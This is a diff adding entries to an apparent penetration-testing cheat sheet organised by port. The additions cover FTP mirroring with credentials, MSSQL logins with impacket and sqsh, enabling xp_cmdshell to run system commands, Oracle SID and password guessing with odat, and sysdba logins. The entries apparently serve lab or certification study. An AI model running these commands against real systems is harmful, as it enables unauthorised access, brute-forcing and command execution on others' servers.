@@ -10,6 +10,8 @@ layout: post
 ###### FTP 21
 ```
 > ftp 10.10.10.10
+Download all ftp files:
+> wget --mirror 'ftp://username:password@10.10.10.10'
 ```
 
 ###### SSH 22
@@ -58,8 +60,46 @@ Other protocols with crackmapexec: ssh,ldap,mssql,winrm
 
 ###### 1443 MSSQL
 ```
+Impacket
 > impacket-mssqlclient -windows-auth domain/sa:password@10.10.10.10
 > impacket-mssqlclient sa:password@10.10.10.10
+
+sqsh
+> sqsh -S 10.10.10.10 -U sa -P "password"
+
+Turning on xp_cmdshell in mssql:
+1> xp_cmdshell 'whoami'
+2> go
+
+If the xp_cmdshell option needs to be turned on first:
+1> EXEC SP_CONFIGURE 'xp_cmdshell', 1
+2> reconfigure
+3> go
+
+If advanced options are turned of, do this before turning xp_cmdshell on:
+1> EXEC SP_CONFIGURE 'show advanced options', 1
+2> reconfigure
+3> go
+```
+
+###### 1521 Oracle TNS listener
+```
+odat.py
+> cd /opt/
+> git clone https://github.com/quentinhardy/odat.git
+> pip3 install python-libnmap cx_Oracle pycrypto
+> python3 odat.py sidguesser -s 10.10.10.10
+> python3 odat.py passwordguesser -s 10.10.10.10 -d SID
+> python3 odat.py passwordguesser -s 10.10.10.10 -d SID
+
+sqlplus
+> sudo apt install oracle-instantclient-sqlplus
+> sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+> sqlplus username/password@10.10.10.10/SID
+
+sysbda
+See sysbda for oracle as being kind of similar as sudo for linux, you can do more cause you have more privileges.
+> sqlplus username/password@10.10.10.10:1521/SID as sysdba
 ```
 
 ###### 3306 MYSQL
